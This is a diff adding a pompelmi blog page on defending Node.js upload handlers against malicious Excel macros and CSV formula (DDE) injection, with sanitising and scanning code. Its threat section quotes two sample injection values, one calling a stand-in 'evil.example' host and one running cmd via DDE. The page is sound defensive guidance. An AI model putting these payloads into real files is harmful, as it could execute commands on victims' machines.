@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="canonical" href="https://pompelmi.app/blog/scan-excel-csv-macros.html" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Scanning Excel and CSV files for malicious macros — pompelmi</title>
+<meta name="description" content="How to scan Excel (.xls, .xlsx, .xlsm) and CSV files for malicious macros, DDE injection, and embedded malware in Node.js using pompelmi and ClamAV.">
+<link rel="icon" type="image/svg+xml" href="../favicon.svg">
+<link rel="icon" type="image/png" href="../favicon.png">
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+
+<div id="header">
+  <a href="../index.html">
+    <img src="../grapefruit.png" alt="pompelmi logo">
+  </a>
+  <div id="header-text">
+    <a href="../index.html"><h1>pomp<span>elmi</span></h1></a>
+    <p>Node.js antivirus scanning via ClamAV &mdash; simple, cross-platform, zero config</p>
+  </div>
+  <div id="header-clear"></div>
+</div>
+
+<div id="navbar">
+  <a href="../index.html">Home</a>
+  <a href="../about.html">About</a>
+  <a href="../quickstart.html">Quickstart</a>
+  <a href="../api.html">API</a>
+  <a href="../docker.html">Docker</a>
+  <a href="../contacts.html">Contacts</a>
+  <a href="../featured-in.html">Featured In</a>
+  <a href="../blog.html" class="active">Blog</a>
+  <a href="https://github.com/pompelmi/pompelmi">GitHub</a>
+  <a href="https://www.npmjs.com/package/pompelmi">npm</a>
+</div>
+
+<div id="page">
+
+  <div id="sidebar">
+    <ul>
+      <span class="sidebar-label">On this page</span>
+      <li><a href="#threat-landscape">Threat landscape</a></li>
+      <li><a href="#clamav-coverage">ClamAV coverage</a></li>
+      <li><a href="#detect-macro-formats">Detecting macro formats</a></li>
+      <li><a href="#dde-in-csv">DDE in CSV files</a></li>
+      <li><a href="#complete-example">Complete example</a></li>
+      <li><a href="#defence-in-depth">Defence in depth</a></li>
+      <li><a href="#next-steps">Next steps</a></li>
+    </ul>
+  </div>
+
+  <div id="content">
+
+    <div class="section" id="threat-landscape">
+      <h2>Scanning Excel and CSV files for malicious macros</h2>
+      <p>
+        Spreadsheet files are a common malware delivery vector. If your application
+        accepts uploads of <code>.xls</code>, <code>.xlsx</code>, <code>.xlsm</code>,
+        <code>.xlsb</code>, or <code>.csv</code> files from untrusted users, you face
+        several distinct threats:
+      </p>
+      <ul>
+        <li>
+          <strong>VBA macros.</strong> Legacy <code>.xls</code> files and macro-enabled
+          <code>.xlsm</code> / <code>.xlsb</code> files can contain Visual Basic for
+          Applications code that executes on the victim's machine when the file is
+          opened. Many ransomware and trojan campaigns are delivered via malicious
+          Excel macros.
+        </li>
+        <li>
+          <strong>DDE (Dynamic Data Exchange) injection in CSV.</strong> A CSV cell
+          that starts with <code>=</code>, <code>+</code>, <code>-</code>, or
+          <code>@</code> can be interpreted as a formula by spreadsheet applications.
+          Cells like <code>=HYPERLINK("http://evil.example/payload","Click here")</code>
+          or <code>=cmd|' /c calc'!A0</code> execute system commands when opened.
+        </li>
+        <li>
+          <strong>Embedded objects and OLE streams.</strong> Office documents can
+          embed other objects — executables, scripts, or other Office files — inside
+          OLE compound document streams.
+        </li>
+      </ul>
+    </div>
+
+    <div class="section" id="clamav-coverage">
+      <h2>What ClamAV detects</h2>
+      <p>
+        ClamAV has extensive coverage of Office malware. It scans OLE2 compound
+        documents (the binary <code>.xls</code> format) and OOXML archives (the
+        ZIP-based <code>.xlsx</code> / <code>.xlsm</code> format), looking for:
+      </p>
+      <ul>
+        <li>Known VBA macro malware signatures (thousands of entries)</li>
+        <li>Heuristic patterns in macro code (obfuscated <code>Shell</code>, <code>WScript</code>, <code>PowerShell</code> calls)</li>
+        <li>Malicious embedded objects and shellcode</li>
+        <li>Suspicious URL patterns in embedded hyperlinks</li>
+      </ul>
+      <p>
+        When ClamAV finds a macro threat it returns exit code 1, which pompelmi maps
+        to <code>Verdict.Malicious</code>. For unknown or novel macro payloads it may
+        return <code>Verdict.Clean</code> — ClamAV is signature-based and cannot
+        detect every possible obfuscated macro.
+      </p>
+      <div class="note">
+        Use pompelmi as one layer in a broader defence, not as the sole control. See
+        the defence-in-depth section below for complementary measures.
+      </div>
+    </div>
+
+    <div class="section" id="detect-macro-formats">
+      <h2>Detecting macro-enabled formats by magic bytes</h2>
+      <p>
+        The file extension alone cannot be trusted — users can rename files. Check
+        the actual format using magic bytes before deciding whether to accept the file:
+      </p>
+      <table>
+        <tr>
+          <th>Format</th>
+          <th>Extension</th>
+          <th>Magic bytes (hex)</th>
+          <th>Notes</th>
+        </tr>
+        <tr>
+          <td>Binary Excel (OLE2)</td>
+          <td><code>.xls</code></td>
+          <td><code>D0 CF 11 E0</code></td>
+          <td>Can contain VBA macros</td>
+        </tr>
+        <tr>
+          <td>OpenXML (ZIP-based)</td>
+          <td><code>.xlsx</code>, <code>.xlsm</code>, <code>.xlsb</code></td>
+          <td><code>50 4B 03 04</code></td>
+          <td><code>.xlsm</code> / <code>.xlsb</code> contain macros</td>
+        </tr>
+        <tr>
+          <td>CSV (plain text)</td>
+          <td><code>.csv</code></td>
+          <td>no specific magic — check content-type and extension</td>
+          <td>Subject to DDE injection</td>
+        </tr>
+      </table>
+
+<pre>function readMagic(filePath, length = 4) {
+  const fd  = require('fs').openSync(filePath, 'r');
+  const buf = Buffer.alloc(length);
+  require('fs').readSync(fd, buf, 0, length, 0);
+  require('fs').closeSync(fd);
+  return buf;
+}
+
+function isMacroEnabled(filePath, originalName) {
+  const magic = readMagic(filePath);
+  const ext   = originalName.split('.').pop()?.toLowerCase();
+
+  // .xls binary format — always supports macros
+  if (magic[0] === 0xD0 &amp;&amp; magic[1] === 0xCF) return true;
+
+  // ZIP-based OOXML — only macro-enabled variants are dangerous
+  const isZip = magic[0] === 0x50 &amp;&amp; magic[1] === 0x4B;
+  return isZip &amp;&amp; (ext === 'xlsm' || ext === 'xlsb');
+}</pre>
+    </div>
+
+    <div class="section" id="dde-in-csv">
+      <h2>Sanitising DDE injection in CSV files</h2>
+      <p>
+        CSV files are plain text, so ClamAV cannot detect DDE injection. You need to
+        sanitise CSV content server-side before storing or processing it.
+      </p>
+      <p>
+        The standard mitigation is to prefix any cell value that starts with
+        <code>=</code>, <code>+</code>, <code>-</code>, or <code>@</code> with a
+        single quote or tab, preventing spreadsheet applications from interpreting it
+        as a formula:
+      </p>
+<pre>const fs = require('fs');
+
+// Sanitise a CSV file in-place: prefix formula triggers with a tab
+function sanitiseCsvDde(filePath) {
+  const content    = fs.readFileSync(filePath, 'utf8');
+  const sanitised  = content
+    .split('\n')
+    .map((line) =&gt; {
+      return line
+        .split(',')
+        .map((cell) =&gt; {
+          const trimmed = cell.trim().replace(/^["']|["']$/g, '');
+          if (/^[=+\-@]/.test(trimmed)) {
+            // Prefix with tab to neutralise formula interpretation
+            return `"\t${trimmed}"`;
+          }
+          return cell;
+        })
+        .join(',');
+    })
+    .join('\n');
+
+  fs.writeFileSync(filePath, sanitised, 'utf8');
+}</pre>
+
+      <div class="warn">
+        DDE sanitisation changes the file content. Apply it only if you intend to
+        store the sanitised version. If you need to preserve the original (e.g. for
+        re-download), sanitise a copy and serve the sanitised version to downstream
+        consumers.
+      </div>
+    </div>
+
+    <div class="section" id="complete-example">
+      <h2>Complete upload handler</h2>
+<pre>const express = require('express');
+const multer  = require('multer');
+const { scan, Verdict } = require('pompelmi');
+const fs = require('fs');
+const os = require('os');
+
+const app    = express();
+const upload = multer({
+  dest:   os.tmpdir(),
+  limits: { fileSize: 20 * 1024 * 1024 }, // 20 MB
+});
+
+const ALLOWED_EXTENSIONS = new Set(['xlsx', 'csv']);
+
+function readMagic(filePath) {
+  const fd  = fs.openSync(filePath, 'r');
+  const buf = Buffer.alloc(4);
+  fs.readSync(fd, buf, 0, 4, 0);
+  fs.closeSync(fd);
+  return buf;
+}
+
+function isMacroEnabled(filePath, originalName) {
+  const magic = readMagic(filePath);
+  const ext   = originalName.split('.').pop()?.toLowerCase();
+  if (magic[0] === 0xD0 &amp;&amp; magic[1] === 0xCF) return true; // .xls
+  const isZip = magic[0] === 0x50 &amp;&amp; magic[1] === 0x4B;
+  return isZip &amp;&amp; (ext === 'xlsm' || ext === 'xlsb');
+}
+
+app.post('/upload/spreadsheet', upload.single('file'), async (req, res) =&gt; {
+  if (!req.file) return res.status(400).json({ error: 'No file provided.' });
+
+  const tmpPath = req.file.path;
+
+  try {
+    const ext = req.file.originalname.split('.').pop()?.toLowerCase();
+
+    // Step 1 — extension allowlist
+    if (!ALLOWED_EXTENSIONS.has(ext)) {
+      return res.status(400).json({ error: `File type .${ext} is not accepted.` });
+    }
+
+    // Step 2 — reject macro-enabled formats
+    if (isMacroEnabled(tmpPath, req.file.originalname)) {
+      return res.status(400).json({
+        error: 'Macro-enabled spreadsheets (.xls, .xlsm, .xlsb) are not accepted. Please save as .xlsx.',
+      });
+    }
+
+    // Step 3 — ClamAV scan
+    const verdict = await scan(tmpPath);
+
+    if (verdict === Verdict.Malicious) {
+      return res.status(400).json({ error: 'Malware detected. Upload rejected.' });
+    }
+    if (verdict === Verdict.ScanError) {
+      return res.status(422).json({ error: 'Scan incomplete. Upload rejected.' });
+    }
+
+    // Step 4 — DDE sanitisation for CSV files
+    if (ext === 'csv') {
+      sanitiseCsvDde(tmpPath);
+    }
+
+    // Step 5 — move to permanent storage
+    return res.json({ status: 'ok', file: req.file.originalname });
+
+  } finally {
+    if (fs.existsSync(tmpPath)) fs.unlinkSync(tmpPath);
+  }
+});
+
+function sanitiseCsvDde(filePath) {
+  const content   = fs.readFileSync(filePath, 'utf8');
+  const sanitised = content.split('\n').map((line) =&gt;
+    line.split(',').map((cell) =&gt; {
+      const trimmed = cell.trim().replace(/^["']|["']$/g, '');
+      return /^[=+\-@]/.test(trimmed) ? `"\t${trimmed}"` : cell;
+    }).join(',')
+  ).join('\n');
+  fs.writeFileSync(filePath, sanitised, 'utf8');
+}</pre>
+    </div>
+
+    <div class="section" id="defence-in-depth">
+      <h2>Defence in depth</h2>
+      <table>
+        <tr>
+          <th>Layer</th>
+          <th>What it stops</th>
+        </tr>
+        <tr>
+          <td>File size limit (Multer)</td>
+          <td>Oversized uploads, resource exhaustion</td>
+        </tr>
+        <tr>
+          <td>Extension allowlist</td>
+          <td>Unexpected file types</td>
+        </tr>
+        <tr>
+          <td>Magic byte check + macro format rejection</td>
+          <td>Misnamed VBA-capable files, legacy binary formats</td>
+        </tr>
+        <tr>
+          <td>pompelmi + ClamAV scan</td>
+          <td>Known macro malware, embedded executables, trojans</td>
+        </tr>
+        <tr>
+          <td>CSV DDE sanitisation</td>
+          <td>Formula injection in plain-text CSV files</td>
+        </tr>
+        <tr>
+          <td>Content-Security-Policy on download responses</td>
+          <td>Client-side formula execution when served back</td>
+        </tr>
+      </table>
+    </div>
+
+    <div class="section" id="next-steps">
+      <h2>Next steps</h2>
+      <ul>
+        <li>
+          Worried about ZIP bombs in archive uploads?
+          See <a href="nodejs-zip-bomb-prevention.html">Preventing ZIP Bomb attacks in Node.js</a>.
+        </li>
+        <li>
+          Dealing with encrypted or password-protected files?
+          See <a href="encrypted-file-scan-nodejs.html">How to handle encrypted/password-protected files during scan</a>.
+        </li>
+        <li>
+          Want a complete upload security checklist?
+          Read <a href="nodejs-file-upload-security-checklist.html">Node.js file upload security checklist</a>.
+        </li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<div id="footer">
+  pompelmi v1.2.0 &nbsp;&mdash;&nbsp;
+  License: ISC &nbsp;&mdash;&nbsp;
+  <a href="https://github.com/pompelmi/pompelmi">github.com/pompelmi/pompelmi</a>
+  &nbsp;&mdash;&nbsp;
+  <a href="https://www.npmjs.com/package/pompelmi">npmjs.com/package/pompelmi</a>
+</div>
+
+</body>
+</html>
